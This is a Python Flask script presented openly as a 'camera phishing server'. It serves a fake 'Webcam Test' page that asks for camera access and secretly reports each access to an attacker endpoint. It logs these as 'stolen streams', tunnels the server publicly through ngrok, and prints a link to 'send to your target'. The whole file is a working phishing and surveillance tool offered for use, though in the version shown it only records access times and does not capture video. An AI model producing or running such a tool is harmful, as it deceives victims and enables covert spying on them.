from flask import Flask, request, render_template_string, Response
import os
import subprocess
import time
import threading

app = Flask(__name__)

# Fake "Webcam Test" page (HTML + JS to access camera)
FAKE_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Webcam Test</title>
    <style>
        body { font-family: Arial; text-align: center; margin-top: 50px; }
        #video { width: 300px; height: 200px; background: #000; border: 2px solid #333; }
        button { padding: 10px 20px; background: #4285F4; color: white; border: none; }
    </style>
</head>
<body>
    <h1>🎥 Webcam Test</h1>
    <p>Click below to test your camera:</p>
    <button onclick="startCamera()">Start Test</button><br><br>
    <video id="video" autoplay muted></video>
    <script>
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                // Secretly send stream to attacker (via WebRTC or ngrok)
                fetch('/stream', { method: 'POST', body: 'Camera accessed!' });
            } catch (err) {
                alert("Camera access denied! (Error: " + err.message + ")");
            }
        }
    </script>
</body>
</html>
"""

# Store stolen streams (in a real attack, you'd use WebRTC or ngrok tunneling)
stolen_streams = []

@app.route("/")
def home():
    return render_template_string(FAKE_PAGE)

@app.route("/stream", methods=["POST"])
def stream():
    # In a real attack, you'd relay the stream via WebRTC or save it
    stolen_streams.append("Camera accessed at: " + time.strftime("%H:%M:%S"))
    print("🎥 Camera accessed! (Check stolen_streams)")
    return "OK"

def start_ngrok(port):
    try:
        os.system("pkill ngrok")  # Kill existing ngrok
        subprocess.Popen(["ngrok", "http", str(port)], stdout=subprocess.DEVNULL)
        time.sleep(3)
        result = subprocess.check_output(["curl", "-s", "http://localhost:4040/api/tunnels"]).decode()
        url = [tunnel["public_url"] for tunnel in eval(result)["tunnels"] if tunnel["proto"] == "https"][0]
        print(f"\n🔥 Ngrok URL: {url}\n")
        return url
    except Exception as e:
        print(f"❌ Ngrok failed: {e}")
        return None

if __name__ == "__main__":
    port = 8080
    print("🚀 Starting camera phishing server...")
    ngrok_url = start_ngrok(port)
    if ngrok_url:
        print(f"🎣 Send this link to your target: {ngrok_url}")
        print("📹 Stolen streams will be logged here.\n")
    app.run(host="0.0.0.0", port=port)
